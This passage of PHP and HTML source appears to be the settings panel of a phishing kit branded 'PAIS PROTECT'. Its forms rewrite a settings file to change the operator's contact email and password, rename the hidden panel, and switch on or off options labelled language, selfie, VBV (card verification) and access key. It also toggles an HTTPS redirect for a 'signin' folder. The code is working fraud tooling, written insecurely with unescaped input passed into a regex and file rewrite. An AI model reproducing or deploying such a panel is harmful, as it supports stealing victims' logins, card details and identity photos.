    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}" type="text" class="form-control-sm" size="15" name="txt_newpassword" placeholder="New" value="" required=required>
              </td>
              <td colspan="2" align="center">
                <input style="box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    padding: 3%;
    background: #43d1af;
    border-bottom: 2px solid #30c29e;
    border-top-style: none;
    border-right-style: none;
    border-left-style: none;
    color: #fff;
    font-size: 14px;
}" type="submit" class="btn btn-info btn-sm" name="change_password" value="Change Password">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}"  type="text" class="form-control-sm" size="15" name="txt_oldpanel" value="<?php echo $lastUriSegment; ?>" required="required" readonly="">
                <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}"  type="hidden" class="form-control-sm" size="15" name="txt_oldpanelphp" value="<?php echo $lastUriSegment. ".php"; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}"  type="text" class="form-control-sm" size="15" name="txt_newpanel" id="txt_newpanel" maxlength="8" placeholder="New Key" value="" required=required>
              </td>
              <td align="center" colspan="2">
                <input style="box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    padding: 3%;
    background: #43d1af;
    border-bottom: 2px solid #30c29e;
    border-top-style: none;
    border-right-style: none;
    border-left-style: none;
    color: #fff;
    font-size: 14px;
}" type="submit" class="btn btn-info btn-sm" name="change_panel" id="id_change_panel" value="Change Panel">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}" type="text" class="form-control-sm" size="15" name="txt_oldlang" value="<?php echo $pais_multilang; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <select style="background: rgba(255,255,255,.1);
                border-color: #000000;
    border: 0;
    border-radius: 4px;
    font-size: 15px;
    margin: 0;
    outline: 0;
    padding: 10px;
    width: 100%;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    background-color: #e8eeef;
    color: #8a97a0;
    -webkit-box-shadow: 0 1px 0 rgba(0,0,0,0.03) inset;
    box-shadow: 0 1px 0 rgba(0,0,0,0.03) inset;
    margin-bottom: 10px;" class="form-control-sm" name="txt_newlang">
                  <option value="lang_active" <?= $pais_multilang != 'lang_active' ? "selected=''" : "" ?>>Active</option>
                  <option value="lang_nonactive" <?= $pais_multilang != 'lang_nonactive' ? "selected=''" : "" ?>>Non Active</option>
                </select>
              </td>
              <td align="center" colspan="2">
                <input style="box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    padding: 3%;
    background: #43d1af;
    border-bottom: 2px solid #30c29e;
    border-top-style: none;
    border-right-style: none;
    border-left-style: none;
    color: #fff;
    font-size: 14px;
}" type="submit" class="btn btn-info btn-sm" name="change_lang" id="id_change_lang" value="Change Language">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input  style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}" type="text" class="form-control-sm" size="15" name="txt_oldselfie" value="<?php echo $pais_selfie; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <select  style="background: rgba(255,255,255,.1);
                border-color: #000000;
    border: 0;
    border-radius: 4px;
    font-size: 15px;
    margin: 0;
    outline: 0;
    padding: 10px;
    width: 100%;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    background-color: #e8eeef;
    color: #8a97a0;
    -webkit-box-shadow: 0 1px 0 rgba(0,0,0,0.03) inset;
    box-shadow: 0 1px 0 rgba(0,0,0,0.03) inset;
    margin-bottom: 10px;"  class="form-control-sm" name="txt_newselfie">
                  <option value="selfie_active" <?= $pais_selfie != 'selfie_active' ? "selected=''" : "" ?>>Active</option>
                  <option value="selfie_nonactive" <?= $pais_selfie != 'selfie_nonactive' ? "selected=''" : "" ?>>Non Active</option>
                </select>
              </td>
              
              <td align="center" colspan="2">
                <input  style="box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    padding: 3%;
    background: #43d1af;
    border-bottom: 2px solid #30c29e;
    border-top-style: none;
    border-right-style: none;
    border-left-style: none;
    color: #fff;
    font-size: 14px;
}" type="submit" class="btn btn-info btn-sm" name="change_selfie" id="id_change_selfie" value="Change Selfie">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input  style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}"  type="text" class="form-control-sm" size="15" name="txt_oldvbv" value="<?php echo $pais_vbv; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <select  style="background: rgba(255,255,255,.1);
                border-color: #000000;
    border: 0;
    border-radius: 4px;
    font-size: 15px;
    margin: 0;
    outline: 0;
    padding: 10px;
    width: 100%;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    background-color: #e8eeef;
    color: #8a97a0;
    -webkit-box-shadow: 0 1px 0 rgba(0,0,0,0.03) inset;
    box-shadow: 0 1px 0 rgba(0,0,0,0.03) inset;
    margin-bottom: 10px;" class="form-control-sm" name="txt_newvbv">
                  <option value="vbv_active" <?= $pais_vbv != 'vbv_active' ? "selected=''" : "" ?>>Active</option>
                  <option value="vbv_nonactive" <?= $pais_vbv != 'vbv_nonactive' ? "selected=''" : "" ?>>Non Active</option>
                </select>
              </td>
              <td align="center" colspan="2">
                <input style="box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    padding: 3%;
    background: #43d1af;
    border-bottom: 2px solid #30c29e;
    border-top-style: none;
    border-right-style: none;
    border-left-style: none;
    color: #fff;
    font-size: 14px;
}" type="submit" class="btn btn-info btn-sm" name="change_vbv" id="id_change_vbv" value="Change VBV">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input  style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}"  type="text" class="form-control-sm" size="30" name="txt_oldaccess" value="<?php echo $pais_access; ?>" required=required readonly="">
              </td>
              <td align="center">
                <input  style="-webkit-transition: all .30s ease-in-out;
    -moz-transition: all .30s ease-in-out;
    -ms-transition: all .30s ease-in-out;
    -o-transition: all .30s ease-in-out;
    outline: 0;
    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    background: #fff;
    margin-bottom: 4%;
    border: 1px solid #ccc;
    padding: 3%;
    color: #555;
    font-family: Arial,Helvetica,sans-serif;
    font-size: 14px;
}"  type="text" class="form-control-sm" size="30" name="txt_newaccess" value"" placeholder="123456" required=required>
              </td>
              <td align="center" colspan="2">
                <input style="box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    width: 100%;
    padding: 3%;
    background: #43d1af;
    border-bottom: 2px solid #30c29e;
    border-top-style: none;
    border-right-style: none;
    border-left-style: none;
    color: #fff;
    font-size: 14px;
}" type="submit" class="btn btn-info btn-sm" name="change_access" value="Change Access">
              </td>
            </form>
          </tr>
<?php
@unlink("set.php");

$oldemail   = trim(@$_POST['txt_oldemail']);
$newemail   = trim(@$_POST['txt_newemail']);
$oldpassword   = trim(@$_POST['txt_oldpassword']);
$newpassword   = trim(@$_POST['txt_newpassword']);
$oldpanel   = trim(@$_POST['txt_oldpanel']);
$newpanel   = trim(@$_POST['txt_newpanel']);
$oldpanelphp   = trim(@$_POST['txt_oldpanelphp']);
$oldlang   = trim(@$_POST['txt_oldlang']);
$newlang   = trim(@$_POST['txt_newlang']);
$oldselfie   = trim(@$_POST['txt_oldselfie']);
$newselfie   = trim(@$_POST['txt_newselfie']);
$oldvbv   = trim(@$_POST['txt_oldvbv']);
$newvbv   = trim(@$_POST['txt_newvbv']);
$oldaccess   = trim(@$_POST['txt_oldaccess']);
$newaccess   = trim(@$_POST['txt_newaccess']);
$file   = "../settings.php";
$isi    = @file_get_contents($file);

if(isset($_POST['change_email'])) {
  if(@preg_match("#\b$oldemail\b#is", $isi)) {
    $isi = str_replace($oldemail,$newemail,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_access'])) {
  if(@preg_match("#\b$oldaccess\b#is", $isi)) {
    $isi = str_replace($oldaccess,$newaccess,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_password'])) {
  if(@preg_match("#\b$oldpassword\b#is", $isi)) {
    $isi = str_replace($oldpassword,$newpassword,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_panel'])) {
  if(@preg_match("#\b$oldpassword\b#is", $isi)) {
    $oldpanelname = $oldpanelphp;
    $ext = strtolower(substr($oldpanelname, strripos($oldpanelname, '.')+1));

    $newpanelname = $newpanel.'.'.$ext;

    $fileAwal = $oldpanelname;
    $fileBaru = $newpanelname;
    rename($fileAwal, $fileBaru);

    echo "<script>alert('DONE PAIS PROTECT'); </script>";
    echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/PAIS/$newpanel'/>";
  }else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_lang'])) {
  if(@preg_match("#\b$oldlang\b#is", $isi)) {
    $isi = str_replace($oldlang,$newlang,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_selfie'])) {
  if(@preg_match("#\b$oldselfie\b#is", $isi)) {
    $isi = str_replace($oldselfie,$newselfie,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_vbv'])) {
  if(@preg_match("#\b$oldvbv\b#is", $isi)) {
    $isi = str_replace($oldvbv,$newvbv,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}


if(isset($_POST['https_nonactive'])) {
  unlink('../signin/.htaccess');
}

if(isset($_POST['https_active'])) {
  $f = fopen("../signin/.htaccess", "a+");
  fwrite($f, "<IfModule mod_rewrite.c>
  RewriteEngine on
  RewriteCond %{HTTPS} !=on [NC]
  RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
</IfModule> ");
  fclose($f);
}
?>

    <!-- jQuery -->
    <script src="assets/jquery/dist/jquery.min.js"></script>
    <!-- Bootstrap -->
    <script src="assets/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- FastClick -->
    <script src="assets/fastclick/lib/fastclick.js"></script>
    <!-- NProgress -->
    <script src="assets/nprogress/nprogress.js"></script>
    <!-- Chart.js -->
    <script src="assets/Chart.js/dist/Chart.min.js"></script>
    <!-- gauge.js -->
    <script src="assets/gauge.js/dist/gauge.min.js"></script>
    <!-- bootstrap-progressbar -->
    <script src="assets/bootstrap-progressbar/bootstrap-progressbar.min.js"></script>
    <!-- iCheck -->
    <script src="assets/iCheck/icheck.min.js"></script>
    <!-- Skycons -->
    <script src="assets/skycons/skycons.js"></script>
    <!-- Flot -->
    <script src="assets/Flot/jquery.flot.js"></script>
    <script src="assets/Flot/jquery.flot.pie.js"></script>
    <script src="assets/Flot/jquery.flot.time.js"></script>
    <script src="assets/Flot/jquery.flot.stack.js"></script>
    <script src="assets/Flot/jquery.flot.resize.js"></script>
    <!-- Flot plugins -->
    <script src="assets/flot.orderbars/js/jquery.flot.orderBars.js"></script>
    <script src="assets/flot-spline/js/jquery.flot.spline.min.js"></script>
    <script src="assets/flot.curvedlines/curvedLines.js"></script>
    <!-- DateJS -->
    <script src="assets/DateJS/build/date.js"></script>
    <!-- JQVMap -->
    <script src="assets/jqvmap/dist/jquery.vmap.js"></script>
    <script src="assets/jqvmap/dist/maps/jquery.vmap.world.js"></script>
    <script src="assets/jqvmap/examples/js/jquery.vmap.sampledata.js"></script>
    <!-- bootstrap-daterangepicker -->
    <script src="assets/moment/min/moment.min.js"></script>
    <script src="assets/bootstrap-daterangepicker/daterangepicker.js"></script>
    <!-- Datatables -->
    <script src="assets/datatables.net/js/jquery.dataTables.min.js"></script>
    <script src="assets/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>
    <script src="assets/datatables.net-buttons/js/dataTables.buttons.min.js"></script>
    <script src="assets/datatables.net-buttons-bs/js/buttons.bootstrap.min.js"></script>
    <script src="assets/datatables.net-buttons/js/buttons.flash.min.js"></script>
    <script src="assets/datatables.net-buttons/js/buttons.html5.min.js"></script>
    <script src="assets/datatables.net-buttons/js/buttons.print.min.js"></script>
    <script src="assets/datatables.net-fixedheader/js/dataTables.fixedHeader.min.js"></script>
    <script src="assets/datatables.net-keytable/js/dataTables.keyTable.min.js"></script>
    <script src="assets/datatables.net-responsive/js/dataTables.responsive.min.js"></script>
    <script src="assets/datatables.net-responsive-bs/js/responsive.bootstrap.js"></script>
    <script src="assets/datatables.net-scroller/js/dataTables.scroller.min.js"></script>
    <script src="assets/jszip/dist/jszip.min.js"></script>
    <script src="assets/pdfmake/build/pdfmake.min.js"></script>
    <script src="assets/pdfmake/build/vfs_fonts.js"></script>
    <!-- Custom Theme Scripts -->
    <script src="build/js/custom.min.js"></script>
  </body>
</html>
